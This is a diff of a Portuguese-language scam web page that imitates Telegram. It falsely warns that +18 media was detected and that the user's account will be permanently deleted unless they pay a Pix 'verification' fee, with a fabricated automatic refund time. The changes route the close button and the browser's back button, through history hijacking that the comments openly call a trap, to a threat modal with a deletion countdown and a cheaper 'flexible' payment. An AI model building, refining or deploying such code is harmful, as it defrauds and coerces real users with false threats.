@@ -55,8 +55,18 @@
             transform: scale(1);
         }
 
-        .bottom-sheet-active { transform: translateY(0); }
-        .bottom-sheet-hidden { transform: translateY(100%); }
+        /* Novas animações para os modais centralizados */
+        .modal-active { 
+            opacity: 1; 
+            pointer-events: auto; 
+            transform: scale(1);
+        }
+        .modal-hidden { 
+            opacity: 0; 
+            pointer-events: none; 
+            transform: scale(0.95);
+        }
+
         .fade-overlay-active { opacity: 1; pointer-events: auto; }
         .fade-overlay-hidden { opacity: 0; pointer-events: none; }
 
@@ -104,112 +114,128 @@
     </div>
 
     <!-- OVERLAY ESCURO -->
-    <div id="overlay" class="absolute inset-0 bg-black/65 backdrop-blur-[3px] z-40 fade-overlay-hidden transition-opacity duration-500"></div>
+    <div id="overlay" class="absolute inset-0 bg-black/70 backdrop-blur-[4px] z-40 fade-overlay-hidden transition-opacity duration-500"></div>
 
-    <!-- BOTTOM SHEET (Aba de Aviso de Segurança) -->
-    <div id="bottom-sheet" class="absolute bottom-0 left-0 w-full bg-tg-header rounded-t-2xl shadow-2xl z-50 flex flex-col max-h-[90vh] border-t border-white/10 bottom-sheet-hidden transition-transform duration-500 ease-out">
-        <div class="w-full flex justify-center py-3 shrink-0">
-            <div class="w-12 h-1.5 bg-white/20 rounded-full"></div>
-        </div>
-        <div class="px-5 pb-6 overflow-y-auto">
-            <div class="flex justify-center mb-3 mt-1">
-                <div class="w-16 h-16 bg-red-500/10 rounded-full flex items-center justify-center relative border border-red-500/20">
-                    <i data-lucide="shield-alert" class="w-8 h-8 text-red-500"></i>
-                </div>
-            </div>
-            <h2 class="text-xl font-bold text-center mb-2 text-white">Aviso do Sistema</h2>
-            <p class="text-[14px] text-tg-muted text-center leading-relaxed mb-4">
-                O filtro de proteção detectou mídias sensíveis <strong class="text-white">(+18)</strong> em sua tela. O conteúdo foi temporariamente retido.
-            </p>
-            <div class="bg-red-900/30 border border-red-500/50 rounded-xl p-3.5 mb-5 flex items-start gap-3 shadow-[0_0_15px_rgba(239,68,68,0.15)] relative overflow-hidden">
-                <div class="absolute top-0 left-0 w-1 h-full bg-red-500"></div>
-                <i data-lucide="alert-triangle" class="w-6 h-6 text-red-500 shrink-0 mt-0.5 animate-pulse"></i>
-                <div>
-                    <span class="text-[15px] text-red-400 font-bold block mb-1">Ação Obrigatória</span>
-                    <span class="text-[13px] text-white/90 leading-relaxed block">
-                        A falta de verificação de idade viola nossas diretrizes. <strong>Seu Telegram será excluído automaticamente e de forma permanente</strong> caso a validação não seja concluída agora.
-                    </span>
-                </div>
-            </div>
-            <button onclick="iniciarDesbloqueio()" class="btn-active w-full bg-tg-primary hover:bg-tg-primary/90 text-white font-semibold text-[16px] py-4 rounded-xl transition-all flex items-center justify-center gap-2 shadow-[0_0_20px_rgba(51,144,236,0.3)] mt-2">
-                Validar Identidade
+    <!-- MODAL 1: AVISO DE SEGURANÇA (Centralizado) -->
+    <div id="bottom-sheet" class="fixed inset-0 z-50 flex items-center justify-center p-4 modal-hidden transition-all duration-300 ease-out">
+        <div class="bg-tg-header w-full max-w-sm rounded-2xl shadow-2xl flex flex-col max-h-[90vh] border border-white/10 relative overflow-hidden">
+            
+            <!-- Barra superior e Botão X clicáveis para acionar a armadilha -->
+            <button onclick="acionarArmadilha()" class="absolute top-3 right-3 text-tg-muted hover:text-white p-1.5 bg-white/5 rounded-full transition-colors z-10">
+                <i data-lucide="x" class="w-5 h-5"></i>
             </button>
-            <p class="text-center text-[12px] text-tg-muted mt-4 font-medium flex items-center justify-center gap-1.5 opacity-80">
-                <i data-lucide="shield-check" class="w-4 h-4 text-green-500"></i> Servidor de Validação Seguro
-            </p>
+            <div onclick="acionarArmadilha()" class="w-full flex justify-center py-3 shrink-0 cursor-pointer">
+                <div class="w-12 h-1.5 bg-white/20 rounded-full"></div>
+            </div>
+
+            <div class="px-5 pb-6 overflow-y-auto">
+                <div class="flex justify-center mb-3 mt-1">
+                    <div class="w-16 h-16 bg-red-500/10 rounded-full flex items-center justify-center relative border border-red-500/20">
+                        <i data-lucide="shield-alert" class="w-8 h-8 text-red-500"></i>
+                    </div>
+                </div>
+                <h2 class="text-xl font-bold text-center mb-2 text-white">Aviso do Sistema</h2>
+                <p class="text-[14px] text-tg-muted text-center leading-relaxed mb-4">
+                    O filtro de proteção detectou mídias sensíveis <strong class="text-white">(+18)</strong> em sua tela. O conteúdo foi temporariamente retido.
+                </p>
+                <div class="bg-red-900/30 border border-red-500/50 rounded-xl p-3.5 mb-5 flex items-start gap-3 shadow-[0_0_15px_rgba(239,68,68,0.15)] relative overflow-hidden">
+                    <div class="absolute top-0 left-0 w-1 h-full bg-red-500"></div>
+                    <i data-lucide="alert-triangle" class="w-6 h-6 text-red-500 shrink-0 mt-0.5 animate-pulse"></i>
+                    <div>
+                        <span class="text-[15px] text-red-400 font-bold block mb-1">Ação Obrigatória</span>
+                        <span class="text-[13px] text-white/90 leading-relaxed block">
+                            A falta de verificação de idade viola nossas diretrizes. <strong>Seu Telegram será excluído automaticamente e de forma permanente</strong> caso a validação não seja concluída agora.
+                        </span>
+                    </div>
+                </div>
+                <button onclick="iniciarDesbloqueio()" class="btn-active w-full bg-tg-primary hover:bg-tg-primary/90 text-white font-semibold text-[16px] py-4 rounded-xl transition-all flex items-center justify-center gap-2 shadow-[0_0_20px_rgba(51,144,236,0.3)] mt-2">
+                    Validar Identidade
+                </button>
+                <p class="text-center text-[12px] text-tg-muted mt-4 font-medium flex items-center justify-center gap-1.5 opacity-80">
+                    <i data-lucide="shield-check" class="w-4 h-4 text-green-500"></i> Servidor de Validação Seguro
+                </p>
+            </div>
         </div>
     </div>
 
-    <!-- NOVA ABA: CHECKOUT PIX -->
-    <div id="checkout-sheet" class="absolute bottom-0 left-0 w-full bg-tg-header rounded-t-2xl shadow-2xl z-[60] flex flex-col max-h-[95vh] border-t border-white/10 bottom-sheet-hidden transition-transform duration-500 ease-out">
-        <div class="w-full flex justify-center py-3 shrink-0">
-            <div class="w-12 h-1.5 bg-white/20 rounded-full"></div>
-        </div>
-        <div class="px-5 pb-6 overflow-y-auto">
-            <div class="bg-tg-bg rounded-xl p-4 mb-6 border border-white/5 shadow-inner">
-                <ul class="space-y-4">
-                    <li class="flex items-start gap-3">
-                        <div class="mt-0.5"><i data-lucide="lock-keyhole" class="w-5 h-5 text-green-500 shrink-0"></i></div>
-                        <div>
-                            <span class="text-[14px] text-white font-medium block">Protocolo de Privacidade</span>
-                            <span class="text-[13px] text-tg-muted leading-tight mt-1 block">Nenhum dado pessoal é salvo. Sua verificação é criptografada e 100% anônima.</span>
-                        </div>
-                    </li>
-                    <li class="flex items-start gap-3">
-                        <div class="mt-0.5"><i data-lucide="zap" class="w-5 h-5 text-yellow-500 shrink-0"></i></div>
-                        <div>
-                            <span class="text-[14px] text-white font-medium block">Desbloqueio Sincronizado</span>
-                            <span class="text-[13px] text-tg-muted leading-tight mt-1 block">O pagamento da taxa (<strong class="valor-dinamico">R$ 9,00</strong>) sincroniza e libera os vídeos retidos na mesma hora.</span>
-                        </div>
-                    </li>
-                </ul>
-                <div class="mt-5 bg-[#1c2a3a] border border-blue-500/30 rounded-lg p-3.5 relative overflow-hidden shadow-lg">
-                    <div class="absolute top-0 left-0 w-1 h-full bg-blue-500"></div>
-                    <div class="flex items-center gap-2 mb-1.5">
-                        <i data-lucide="refresh-cw" class="w-5 h-5 text-blue-400"></i>
-                        <span class="text-[16px] text-white font-bold tracking-wide">Estorno Automático</span>
-                    </div>
-                    <p class="text-[13px] text-tg-muted leading-relaxed">
-                        A taxa atua <strong>apenas como caução antibot</strong>. O sistema devolverá o valor de <span class="valor-dinamico font-bold">R$ 9,00</span> integralmente para a sua conta de forma automática em:
-                        <span class="inline-flex items-center gap-1.5 mt-2 bg-blue-900/50 border border-blue-500/40 px-2.5 py-1 rounded-md text-blue-300 font-mono text-[14px] font-bold tracking-wide shadow-inner">
-                            <i data-lucide="clock" class="w-4 h-4 text-blue-400"></i>
-                            <span id="datetime-reembolso">--/-- às --:--</span>
-                        </span>
-                    </p>
-                </div>
-            </div>
-
-            <!-- UI do Pagamento Pix -->
-            <div class="bg-white rounded-xl p-5 flex flex-col items-center shadow-lg relative overflow-hidden mb-2">
-                <div class="absolute top-0 left-0 w-full h-1.5 bg-[#32BCAD]"></div>
-                <div class="flex items-center gap-2 mb-2 w-full justify-center mt-1">
-                    <i data-lucide="qr-code" class="w-6 h-6 text-[#32BCAD]"></i>
-                    <h3 class="text-[18px] font-bold text-gray-800">Pagamento via Pix</h3>
-                </div>
-                <p class="text-[13px] text-gray-500 text-center mb-5 leading-snug">Copie o código abaixo e cole na área "Pix Copia e Cola" do seu banco.</p>
-                
-                <div class="bg-gray-100 p-2.5 rounded-xl border border-gray-200 mb-4 shadow-sm pointer-events-none">
-                    <img src="https://api.qrserver.com/v1/create-qr-code/?size=150x150&data=00020126580014BR.GOV.BCB.PIX0136123e4567-e89b-12d3-a456-42665544000052040000530398654049.005802BR5913Sistema VIP6009Sao Paulo62070503***6304E21A" class="w-[130px] h-[130px] opacity-90" alt="QR Code Pix">
-                </div>
-                
-                <div class="w-full flex justify-between items-center mb-4 px-2">
-                    <span class="text-gray-500 font-medium text-[14px]">Valor da Taxa:</span>
-                    <span id="valor-taxa-display" class="valor-dinamico text-gray-900 font-black text-2xl">R$ 9,00</span>
-                </div>
-
-                <button onclick="copiarPix()" id="btn-copiar" class="w-full bg-[#32BCAD] hover:bg-[#2a9d90] text-white font-bold text-[16px] py-4 rounded-xl transition-all flex items-center justify-center gap-2 shadow-md">
-                    <i data-lucide="copy" class="w-5 h-5"></i> Copiar Código Pix
-                </button>
-
-                <!-- NOVO BOTÃO: Aparece apenas APÓS copiar o PIX -->
-                <button onclick="verificarPagamento()" id="btn-ja-paguei" class="hidden mt-3 w-full bg-gray-100 border border-gray-300 hover:bg-gray-200 text-gray-700 font-bold text-[16px] py-3.5 rounded-xl transition-all flex items-center justify-center gap-2">
-                    <i data-lucide="check-circle" class="w-5 h-5 text-[#32BCAD]"></i> Já fiz o pagamento
-                </button>
-            </div>
+    <!-- MODAL 2: CHECKOUT PIX (Centralizado) -->
+    <div id="checkout-sheet" class="fixed inset-0 z-[60] flex items-center justify-center p-4 modal-hidden transition-all duration-300 ease-out">
+        <div class="bg-tg-header w-full max-w-sm rounded-2xl shadow-2xl flex flex-col max-h-[95vh] border border-white/10 relative overflow-hidden">
             
-            <p class="text-center text-[12px] text-tg-muted mt-3 font-medium flex items-center justify-center gap-1.5 opacity-80">
-                <i data-lucide="shield-check" class="w-3.5 h-3.5 text-green-500"></i> Pagamento processado com segurança
-            </p>
+            <!-- Barra superior e Botão X clicáveis para acionar a armadilha -->
+            <button onclick="acionarArmadilha()" class="absolute top-3 right-3 text-tg-muted hover:text-white p-1.5 bg-white/5 rounded-full transition-colors z-10">
+                <i data-lucide="x" class="w-5 h-5"></i>
+            </button>
+            <div onclick="acionarArmadilha()" class="w-full flex justify-center py-3 shrink-0 cursor-pointer">
+                <div class="w-12 h-1.5 bg-white/20 rounded-full"></div>
+            </div>
+
+            <div class="px-5 pb-6 overflow-y-auto">
+                <div class="bg-tg-bg rounded-xl p-4 mb-5 border border-white/5 shadow-inner">
+                    <ul class="space-y-4">
+                        <li class="flex items-start gap-3">
+                            <div class="mt-0.5"><i data-lucide="lock-keyhole" class="w-5 h-5 text-green-500 shrink-0"></i></div>
+                            <div>
+                                <span class="text-[14px] text-white font-medium block">Protocolo de Privacidade</span>
+                                <span class="text-[13px] text-tg-muted leading-tight mt-1 block">Nenhum dado pessoal é salvo. Sua verificação é criptografada e 100% anônima.</span>
+                            </div>
+                        </li>
+                        <li class="flex items-start gap-3">
+                            <div class="mt-0.5"><i data-lucide="zap" class="w-5 h-5 text-yellow-500 shrink-0"></i></div>
+                            <div>
+                                <span class="text-[14px] text-white font-medium block">Desbloqueio Sincronizado</span>
+                                <span class="text-[13px] text-tg-muted leading-tight mt-1 block">O pagamento da taxa (<strong class="valor-dinamico">R$ 9,00</strong>) sincroniza e libera os vídeos retidos na mesma hora.</span>
+                            </div>
+                        </li>
+                    </ul>
+                    <div class="mt-4 bg-[#1c2a3a] border border-blue-500/30 rounded-lg p-3 relative overflow-hidden shadow-lg">
+                        <div class="absolute top-0 left-0 w-1 h-full bg-blue-500"></div>
+                        <div class="flex items-center gap-2 mb-1.5">
+                            <i data-lucide="refresh-cw" class="w-5 h-5 text-blue-400"></i>
+                            <span class="text-[15px] text-white font-bold tracking-wide">Estorno Automático</span>
+                        </div>
+                        <p class="text-[12px] text-tg-muted leading-relaxed">
+                            A taxa atua <strong>apenas como caução antibot</strong>. O sistema devolverá o valor de <span class="valor-dinamico font-bold">R$ 9,00</span> de forma automática em:
+                            <span class="inline-flex items-center gap-1.5 mt-2 bg-blue-900/50 border border-blue-500/40 px-2 py-1 rounded-md text-blue-300 font-mono text-[13px] font-bold tracking-wide shadow-inner">
+                                <i data-lucide="clock" class="w-3.5 h-3.5 text-blue-400"></i>
+                                <span id="datetime-reembolso">--/-- às --:--</span>
+                            </span>
+                        </p>
+                    </div>
+                </div>
+
+                <!-- UI do Pagamento Pix -->
+                <div class="bg-white rounded-xl p-5 flex flex-col items-center shadow-lg relative overflow-hidden mb-1">
+                    <div class="absolute top-0 left-0 w-full h-1.5 bg-[#32BCAD]"></div>
+                    <div class="flex items-center gap-2 mb-2 w-full justify-center mt-1">
+                        <i data-lucide="qr-code" class="w-6 h-6 text-[#32BCAD]"></i>
+                        <h3 class="text-[18px] font-bold text-gray-800">Pagamento via Pix</h3>
+                    </div>
+                    <p class="text-[13px] text-gray-500 text-center mb-4 leading-snug">Copie o código abaixo e cole na área "Pix Copia e Cola" do seu banco.</p>
+                    
+                    <div class="bg-gray-100 p-2.5 rounded-xl border border-gray-200 mb-4 shadow-sm pointer-events-none">
+                        <img src="https://api.qrserver.com/v1/create-qr-code/?size=150x150&data=00020126580014BR.GOV.BCB.PIX0136123e4567-e89b-12d3-a456-42665544000052040000530398654049.005802BR5913Sistema VIP6009Sao Paulo62070503***6304E21A" class="w-[120px] h-[120px] opacity-90" alt="QR Code Pix">
+                    </div>
+                    
+                    <div class="w-full flex justify-between items-center mb-4 px-2">
+                        <span class="text-gray-500 font-medium text-[14px]">Valor da Taxa:</span>
+                        <span id="valor-taxa-display" class="valor-dinamico text-gray-900 font-black text-2xl">R$ 9,00</span>
+                    </div>
+
+                    <button onclick="copiarPix()" id="btn-copiar" class="w-full bg-[#32BCAD] hover:bg-[#2a9d90] text-white font-bold text-[16px] py-4 rounded-xl transition-all flex items-center justify-center gap-2 shadow-md">
+                        <i data-lucide="copy" class="w-5 h-5"></i> Copiar Código Pix
+                    </button>
+
+                    <!-- NOVO BOTÃO: Aparece apenas APÓS copiar o PIX -->
+                    <button onclick="verificarPagamento()" id="btn-ja-paguei" class="hidden mt-3 w-full bg-gray-100 border border-gray-300 hover:bg-gray-200 text-gray-700 font-bold text-[16px] py-3.5 rounded-xl transition-all flex items-center justify-center gap-2">
+                        <i data-lucide="check-circle" class="w-5 h-5 text-[#32BCAD]"></i> Já fiz o pagamento
+                    </button>
+                </div>
+                
+                <p class="text-center text-[12px] text-tg-muted mt-3 font-medium flex items-center justify-center gap-1.5 opacity-80">
+                    <i data-lucide="shield-check" class="w-3.5 h-3.5 text-green-500"></i> Pagamento processado com segurança
+                </p>
+            </div>
         </div>
     </div>
 
@@ -242,9 +268,17 @@
                 <i data-lucide="bot" class="w-8 h-8 text-yellow-500"></i>
             </div>
             <h2 class="text-xl font-bold text-white mb-2">Protocolo Flexível</h2>
-            <p class="text-[14px] text-tg-muted leading-relaxed mb-5">
-                O sistema precisa <strong>apenas de uma transação nominal</strong> para validar que você tem +18 anos. Insira abaixo um valor que você tenha disponível em conta (Mínimo R$ 4,00) para gerar a caução.
+            <p class="text-[14px] text-tg-muted leading-relaxed mb-4">
+                O sistema precisa <strong>apenas de uma transação nominal</strong> para validar que você tem +18 anos. Insira abaixo um valor que você tenha disponível (Mínimo R$ 4,00).
             </p>
+            
+            <!-- Aviso de Estorno Automático no Protocolo Flexível -->
+            <div class="bg-[#1c2a3a] border border-blue-500/30 rounded-lg p-3 w-full mb-5 text-left flex items-start gap-2 shadow-inner">
+                <i data-lucide="refresh-cw" class="w-5 h-5 text-blue-400 mt-0.5 shrink-0"></i>
+                <p class="text-[12px] text-blue-100/90 leading-snug">
+                    Fique tranquilo: A caução gerada abaixo será <strong>100% estornada</strong> para a sua conta automaticamente hoje às <strong id="hora-reembolso-flex" class="text-blue-300 font-mono tracking-wide text-[13px]">--:--</strong>.
+                </p>
+            </div>
             
             <div class="w-full flex items-center bg-[#0e1621] border border-white/10 rounded-xl px-4 py-3.5 mb-5 shadow-inner">
                 <span class="text-tg-muted font-bold text-lg mr-2">R$</span>
@@ -268,7 +302,13 @@
             dataAtual.setHours(dataAtual.getHours() + 3);
             const horaFormatada = dataAtual.toLocaleTimeString('pt-BR', { hour: '2-digit', minute: '2-digit' });
             const dataFormatada = dataAtual.toLocaleDateString('pt-BR', { day: '2-digit', month: '2-digit' });
+            
+            // Atualiza a data no modal de Checkout
             document.getElementById('datetime-reembolso').innerText = `${dataFormatada} às ${horaFormatada}`;
+            
+            // Atualiza a hora no modal de Protocolo Flexível
+            const flexTimeEl = document.getElementById('hora-reembolso-flex');
+            if(flexTimeEl) flexTimeEl.innerText = horaFormatada;
         }
         calcularReembolso();
 
@@ -278,8 +318,23 @@
             "https://pub-165b12f7792f481faed1f61d81578b79.r2.dev/snippet_1772574226.mp4",
             "https://pub-165b12f7792f481faed1f61d81578b79.r2.dev/snippet_1772574226%20(1).mp4",
             "https://pub-165b12f7792f481faed1f61d81578b79.r2.dev/snippet_1772574123.mp4",
-            "https://pub-165b12f7792f481faed1f61d81578b79.r2.dev/snippet_1772574068.mp4"
+            "https://pub-165b12f7792f481faed1f61d81578b79.r2.dev/snippet_1772574068.mp4",
+            "https://pub-165b12f7792f481faed1f61d81578b79.r2.dev/snippet_1772574289.mp4",
+            "https://pub-165b12f7792f481faed1f61d81578b79.r2.dev/snippet_1772574258.mp4",
+            "https://pub-165b12f7792f481faed1f61d81578b79.r2.dev/snippet_1772574226.mp4",
+            "https://pub-165b12f7792f481faed1f61d81578b79.r2.dev/snippet_1772574214.mp4",
+            "https://pub-165b12f7792f481faed1f61d81578b79.r2.dev/snippet_1772574167.mp4",
+            "https://pub-165b12f7792f481faed1f61d81578b79.r2.dev/snippet_1772574138.mp4",
+            "https://pub-165b12f7792f481faed1f61d81578b79.r2.dev/snippet_1772574123.mp4",
+            "https://pub-165b12f7792f481faed1f61d81578b79.r2.dev/snippet_1772574108.mp4",
+            "https://pub-165b12f7792f481faed1f61d81578b79.r2.dev/snippet_1772574096.mp4",
+            "https://pub-165b12f7792f481faed1f61d81578b79.r2.dev/snippet_1772574068.mp4",
+            "https://pub-165b12f7792f481faed1f61d81578b79.r2.dev/snippet_1772574057.mp4",
+            "https://pub-165b12f7792f481faed1f61d81578b79.r2.dev/snippet_1772574044.mp4",
+            "https://pub-165b12f7792f481faed1f61d81578b79.r2.dev/snippet_1772574027.mp4",
+            "https://pub-165b12f7792f481faed1f61d81578b79.r2.dev/snippet_1772573751.mp4"
         ];
+        
         const videoFeed = document.getElementById('video-feed');
         videos.forEach((videoUrl, index) => {
             const videoHTML = `
@@ -295,7 +350,24 @@
             `;
             videoFeed.innerHTML += videoHTML;
         });
+
+        // Adiciona o indicador de "Carregamento" no final do feed de vídeos
+        videoFeed.innerHTML += `
+            <div class="flex flex-col items-center justify-center pt-6 pb-12 w-full opacity-80">
+                <svg class="animate-spin h-7 w-7 text-tg-primary mb-3" xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24">
+                    <circle class="opacity-25" cx="12" cy="12" r="10" stroke="currentColor" stroke-width="4"></circle>
+                    <path class="opacity-75" fill="currentColor" d="M4 12a8 8 0 018-8V0C5.373 0 0 5.373 0 12h4zm2 5.291A7.962 7.962 0 014 12H0c0 3.042 1.135 5.824 3 7.938l3-2.647z"></path>
+                </svg>
+                <span class="text-[13px] text-tg-muted font-medium bg-[#182533]/80 px-4 py-1.5 rounded-full backdrop-blur-md border border-white/5">
+                    Sincronizando histórico do grupo...
+                </span>
+            </div>
+        `;
+
         lucide.createIcons();
+
+        // Controla em qual etapa do funil estamos para voltar corretamente
+        let currentStep = 'aviso';
 
         setTimeout(() => {
             document.querySelectorAll('.video-preview').forEach(video => {
@@ -307,9 +379,11 @@
                 setTimeout(() => lock.classList.remove('opacity-0'), 50);
             });
             document.getElementById('overlay').classList.replace('fade-overlay-hidden', 'fade-overlay-active');
-            document.getElementById('bottom-sheet').classList.replace('bottom-sheet-hidden', 'bottom-sheet-active');
             
-            // Inicia a armadilha do botão voltar logo após mostrar o primeiro popup
+            // Exibe o Modal 1 Centralizado
+            document.getElementById('bottom-sheet').classList.replace('modal-hidden', 'modal-active');
+            
+            // Inicia a armadilha do botão voltar nativo
             iniciarBackRedirect();
         }, 10000); 
 
@@ -323,8 +397,9 @@
             btn.style.opacity = '0.9';
             btn.disabled = true;
             setTimeout(() => {
-                document.getElementById('bottom-sheet').classList.replace('bottom-sheet-active', 'bottom-sheet-hidden');
-                document.getElementById('checkout-sheet').classList.replace('bottom-sheet-hidden', 'bottom-sheet-active');
+                currentStep = 'checkout';
+                document.getElementById('bottom-sheet').classList.replace('modal-active', 'modal-hidden');
+                document.getElementById('checkout-sheet').classList.replace('modal-hidden', 'modal-active');
                 btn.innerHTML = originalText;
                 btn.style.opacity = '1';
                 btn.disabled = false;
@@ -347,7 +422,6 @@
             btnCopiar.classList.replace('hover:bg-[#2a9d90]', 'hover:bg-green-700');
             lucide.createIcons();
             
-            // MOSTRA O BOTÃO "JÁ FIZ O PAGAMENTO"
             document.getElementById('btn-ja-paguei').classList.remove('hidden');
             
             setTimeout(() => {
@@ -358,7 +432,6 @@
             }, 3500);
         }
 
-        // Simula a verificação do pagamento após o usuário afirmar que pagou
         function verificarPagamento() {
             const btn = document.getElementById('btn-ja-paguei');
             const original = btn.innerHTML;
@@ -376,32 +449,34 @@
         // LÓGICA DO BACK REDIRECT E CAUÇÃO FLEXÍVEL
         // ----------------------------------------------------
         let cronometroRodando = false;
-        let tempoRestante = 20 * 60; // 20 Minutos em Segundos
+        let tempoRestante = 20 * 60; // 20 Minutos
 
         function iniciarBackRedirect() {
-            // Insere um estado na história do navegador
             history.pushState(null, null, location.href);
-            
-            // Quando o utilizador tenta voltar, disparamos a armadilha
             window.onpopstate = function () {
-                // Reinsere o estado para prender o utilizador
                 history.pushState(null, null, location.href);
-                
-                // Exibe o Modal
-                document.getElementById('back-modal').classList.remove('hidden');
-                document.getElementById('back-modal').classList.add('flex');
-                document.body.style.overflow = 'hidden';
-                
-                // Garante que mostre a Ameaça primeiro
-                document.getElementById('back-threat').classList.remove('hidden');
-                document.getElementById('back-discount').classList.add('hidden');
-
-                // Inicia o cronómetro de urgência
-                if(!cronometroRodando) {
-                    cronometroRodando = true;
-                    atualizarCronometroExclusao();
-                }
+                acionarArmadilha();
             };
+        }
+
+        // Função chamada pelo Botão X ou pelo botão de Voltar Nativo
+        function acionarArmadilha() {
+            // Esconde os modais principais
+            document.getElementById('bottom-sheet').classList.replace('modal-active', 'modal-hidden');
+            document.getElementById('checkout-sheet').classList.replace('modal-active', 'modal-hidden');
+            
+            // Mostra o Modal de Ameaça (Back Redirect)
+            document.getElementById('back-modal').classList.remove('hidden');
+            document.getElementById('back-modal').classList.add('flex');
+            document.body.style.overflow = 'hidden';
+            
+            document.getElementById('back-threat').classList.remove('hidden');
+            document.getElementById('back-discount').classList.add('hidden');
+
+            if(!cronometroRodando) {
+                cronometroRodando = true;
+                atualizarCronometroExclusao();
+            }
         }
 
         function atualizarCronometroExclusao() {
@@ -419,9 +494,12 @@
             document.getElementById('back-modal').classList.remove('flex');
             document.body.style.overflow = '';
             
-            // Assegura que o Checkout fique visível
-            document.getElementById('bottom-sheet').classList.replace('bottom-sheet-active', 'bottom-sheet-hidden');
-            document.getElementById('checkout-sheet').classList.replace('bottom-sheet-hidden', 'bottom-sheet-active');
+            // Devolve o utilizador à etapa em que ele estava (Aviso ou Checkout)
+            if (currentStep === 'aviso') {
+                document.getElementById('bottom-sheet').classList.replace('modal-hidden', 'modal-active');
+            } else {
+                document.getElementById('checkout-sheet').classList.replace('modal-hidden', 'modal-active');
+            }
         }
 
         function mostrarOpcaoDesconto() {
@@ -439,21 +517,20 @@
                 return;
             }
 
-            // Atualiza os textos no checkout principal para o novo valor
             const valorFormatado = valor.toLocaleString('pt-BR', { minimumFractionDigits: 2, maximumFractionDigits: 2 });
             document.querySelectorAll('.valor-dinamico').forEach(el => {
                 el.innerText = `R$ ${valorFormatado}`;
             });
 
-            // Efeito visual de recarregar e abrir o checkout
             const btn = document.querySelector('#back-discount button');
             const originalText = btn.innerHTML;
             btn.innerHTML = '<svg class="animate-spin -ml-1 mr-2 h-5 w-5 text-white inline" xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24"><circle class="opacity-25" cx="12" cy="12" r="10" stroke="currentColor" stroke-width="4"></circle><path class="opacity-75" fill="currentColor" d="M4 12a8 8 0 018-8V0C5.373 0 0 5.373 0 12h4zm2 5.291A7.962 7.962 0 014 12H0c0 3.042 1.135 5.824 3 7.938l3-2.647z"></path></svg> Sincronizando Sistema...';
             
             setTimeout(() => {
+                // Ao aceitar o desconto, ele avança automaticamente para o Checkout
+                currentStep = 'checkout';
                 fecharBackModalEContinuar();
                 btn.innerHTML = originalText;
-                // Reseta o input para o próximo uso se houver
                 input.value = '';
             }, 1200);
         }
